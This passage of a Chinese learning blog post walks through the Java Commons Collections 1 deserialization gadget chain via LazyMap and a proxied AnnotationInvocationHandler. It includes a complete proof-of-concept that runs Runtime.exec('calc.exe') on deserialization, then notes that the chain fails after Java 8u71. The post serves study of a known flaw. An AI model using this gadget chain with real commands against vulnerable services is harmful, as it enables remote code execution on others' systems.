<p>ExampleInvocationHandler类实现了invoke方法，作用是监控到调用的方法名是get的时候，返回一个特殊字符串<code>Hacked Object</code>。</p>
<p>在外部调用这个ExampleInvocationHandler:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> ExampleInvocationHandler(<span class="keyword">new</span> HashMap());</span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;Map.class&#125;,</span><br><span class="line">                handler);</span><br><span class="line">        proxyMap.put(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">        String result = (String) proxyMap.get(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同理<code>sun.reflect.annotation.AnnotationInvocationHandler</code>这个类实际上就是一个<code>InvocationHandler</code>，我们如果把这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到<code>AnnotationInvocationHandler#invoke</code>方法中，进而触发我们的<code>Lazy#get</code>。</p>
<h5 id="使用LazyMap构造利用链"><a href="#使用LazyMap构造利用链" class="headerlink" title="使用LazyMap构造利用链"></a>使用LazyMap构造利用链</h5><p>修改POC，如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> String[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        </span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler); oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>首先使用LazyMap替换TranformedMap</p>
</li>
<li><p>然后使用<code>proxy</code>对象代理，代理<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure></li>
<li><p>我们不能直接对其进行序列化，因为我们的入口点是<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>，所以我们需要对<code>AnnotationInvocationHandler</code>对这个<code>proxyMap</code>进行包裹</p>
</li>
</ul>
<h5 id="LazyMap的缺点"><a href="#LazyMap的缺点" class="headerlink" title="LazyMap的缺点"></a>LazyMap的缺点</h5><p>和TransformedMap对比，LazyMap仍然无法解决CommonCollections1这条利用链在高版本java(8u71以后)中得到使用问题。</p>
<p>不能利用的主要原因和TransformedMap一样，二者都是继承<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，它的<code>readObject</code>逻辑发生变化，上面的也提到过了。</p>
<h5 id="个人的总结-1"><a href="#个人的总结-1" class="headerlink" title="个人的总结"></a>个人的总结</h5><p>LazyMapz中的<code>this.factory.transform(key);</code> 会调用重写transform</p>
<p><img src="image-20230513170756878.png" alt="image-20230513170756878"></p>
<p>构造方法中写了factory的来源是 内容 可控 的</p>
<p><img src="image-20230513170912185.png" alt="image-20230513170912185"></p>
<p>到这里要想的是咋触发 LazyMap的get方法  </p>
<p><code>AnnotationInvocationHandler</code>中  的invoke方法 中调用想要的map类的get方法，同时只需要在构造方法处传入LazyMap即可</p>
<p><img src="image-20230513171212403.png" alt="image-20230513171212403"></p>
<p>涉及到上边说的代理类  </p>
<p><img src="image-20230513171333055.png" alt="image-20230513171333055"></p>
<p>和TransformedMap的区别也就是是在于后边这里了</p>
<blockquote>
<p>个人反思</p>
<p>Java的饼要学 画 了很久 学的过程中 由于Java 基础很差 学的浑身难受 但是好久没有这种 纯粹的学知识的感觉了</p>
<p>这次只学了个 CC1  对一个连psvm都不知道的人    感觉提升还是有的</p>
<p>P神的安全漫谈和白日梦组长还有各种文章都</p>
<p>很受用 还有很多不懂的点继续整8.。</p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">One</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/05/13/Java%E5%AE%89%E5%85%A8%E5%88%9D%E6%AD%A5-CC1/">http://example.com/2023/05/13/Java%E5%AE%89%E5%85%A8%E5%88%9D%E6%AD%A5-CC1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/02/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">内网学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">One</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/paleonec" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">博客重构中。。。。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84"><span class="toc-number">1.</span> <span class="toc-text">反射</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%80%E4%B8%AA%E2%80%9D%E7%B1%BB%E2%80%9D-java-lang-Class-%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.</span> <span class="toc-text">获取一个”类”(java.lang.Class )的方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#forName"><span class="toc-number">1.2.</span> <span class="toc-text">forName</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI"><span class="toc-number">2.</span> <span class="toc-text">RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RMI%E5%88%A9%E7%94%A8codebase%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">RMI利用codebase执行任意代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#yoserial"><span class="toc-number">3.</span> <span class="toc-text">yoserial</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLDNS"><span class="toc-number">4.</span> <span class="toc-text">URLDNS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E5%88%86%E6%9E%90"><span class="toc-number">4.1.</span> <span class="toc-text">代码层分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.2.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommomCollections1"><span class="toc-number">5.</span> <span class="toc-text">CommomCollections1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TransformedMap%E9%93%BE%E5%AD%90"><span class="toc-number">5.1.</span> <span class="toc-text">TransformedMap链子</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4POC"><span class="toc-number">5.1.1.</span> <span class="toc-text">完整POC</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#P%E7%A5%9E%E7%AE%80%E5%8C%96%E7%89%88demo"><span class="toc-number">5.1.2.</span> <span class="toc-text">P神简化版demo</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#TransformedMap"><span class="toc-number">5.1.3.</span> <span class="toc-text">TransformedMap</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Transformer"><span class="toc-number">5.1.4.</span> <span class="toc-text">Transformer</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ConstantTransformer"><span class="toc-number">5.1.5.</span> <span class="toc-text">ConstantTransformer</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#InvokerTransformer"><span class="toc-number">5.1.6.</span> <span class="toc-text">InvokerTransformer</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ChainedTransformer"><span class="toc-number">5.1.7.</span> <span class="toc-text">ChainedTransformer</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AnnotationInvocationHandler"><span class="toc-number">5.1.8.</span> <span class="toc-text">AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF"><span class="toc-number">5.1.9.</span> <span class="toc-text">一些思路</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%BA%E5%95%A5Annotation%E4%BD%BF%E7%94%A8Retention"><span class="toc-number">5.1.9.1.</span> <span class="toc-text">为啥Annotation使用Retention</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%BA%E5%95%A5%E5%8F%AA%E6%9C%89Java-8u71%E4%BB%A5%E5%89%8D%E7%9A%84%E7%89%88%E6%9C%AC%E5%8F%AF%E4%BB%A5%E8%A7%A6%E5%8F%91"><span class="toc-number">5.1.9.2.</span> <span class="toc-text">为啥只有Java 8u71以前的版本可以触发</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%BA%E5%95%A5Transformer%E9%87%8C%E9%9D%A2%E8%A6%81%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%B0%84%EF%BC%8C%E8%80%8C%E4%B8%8D%E6%98%AF%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8"><span class="toc-number">5.1.9.3.</span> <span class="toc-text">为啥Transformer里面要使用反射，而不是直接调用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AA%E4%BA%BA%E7%9A%84%E6%80%BB%E7%BB%93"><span class="toc-number">5.2.</span> <span class="toc-text">个人的总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LazyMap%E7%B1%BB%E6%9E%84%E5%BB%BA%E7%9A%84%E9%93%BE%E5%AD%90"><span class="toc-number">5.3.</span> <span class="toc-text">LazyMap类构建的链子</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Java%E5%AF%B9%E8%B1%A1%E4%BB%A3%E7%90%86"><span class="toc-number">5.3.1.</span> <span class="toc-text">Java对象代理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8LazyMap%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">5.3.2.</span> <span class="toc-text">使用LazyMap构造利用链</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LazyMap%E7%9A%84%E7%BC%BA%E7%82%B9"><span class="toc-number">5.3.3.</span> <span class="toc-text">LazyMap的缺点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%AA%E4%BA%BA%E7%9A%84%E6%80%BB%E7%BB%93-1"><span class="toc-number">5.3.4.</span> <span class="toc-text">个人的总结</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/05/13/Java%E5%AE%89%E5%85%A8%E5%88%9D%E6%AD%A5-CC1/" title="Java安全初步+CC1"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java安全初步+CC1"/></a><div class="content"><a class="title" href="/2023/05/13/Java%E5%AE%89%E5%85%A8%E5%88%9D%E6%AD%A5-CC1/" title="Java安全初步+CC1">Java安全初步+CC1</a><time datetime="2023-05-13T09:44:03.000Z" title="Created 2023-05-13 17:44:03">2023-05-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" title="内网学习"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网学习"/></a><div class="content"><a class="title" href="/2023/02/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" title="内网学习">内网学习</a><time datetime="2023-02-21T05:57:41.000Z" title="Created 2023-02-21 13:57:41">2023-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/" title="Webshell工具学习"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Webshell工具学习"/></a><div class="content"><a class="title" href="/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/" title="Webshell工具学习">Webshell工具学习</a><time datetime="2023-01-21T05:30:21.000Z" title="Created 2023-01-21 13:30:21">2023-01-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/" title="DASCTF2022NOV月赛"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF2022NOV月赛"/></a><div class="content"><a class="title" href="/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/" title="DASCTF2022NOV月赛">DASCTF2022NOV月赛</a><time datetime="2022-11-30T12:58:56.000Z" title="Created 2022-11-30 20:58:56">2022-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2022/" title="安洵杯2022"><img src="/imgg/3.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="安洵杯2022"/></a><div class="content"><a class="title" href="/2022/11/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2022/" title="安洵杯2022">安洵杯2022</a><time datetime="2022-11-28T08:59:18.000Z" title="Created 2022-11-28 16:59:18">2022-11-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By One</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>